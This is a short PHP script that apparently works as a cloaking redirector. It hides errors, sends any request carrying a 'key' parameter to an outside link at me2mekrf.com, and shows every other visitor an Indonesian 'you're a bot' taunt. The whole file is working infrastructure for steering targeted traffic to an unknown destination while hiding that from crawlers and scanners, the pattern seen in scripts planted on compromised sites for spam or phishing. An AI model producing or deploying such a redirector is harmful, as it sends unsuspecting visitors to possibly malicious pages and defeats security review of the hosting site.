<?php
error_reporting(0);
if ($_GET['key']) {
    header('HTTP/1.0 302 Found');
    header("Location: https://me2mekrf.com/r/ckptww");
}else{
    echo "hayoo anda bot yaaa";
}
?>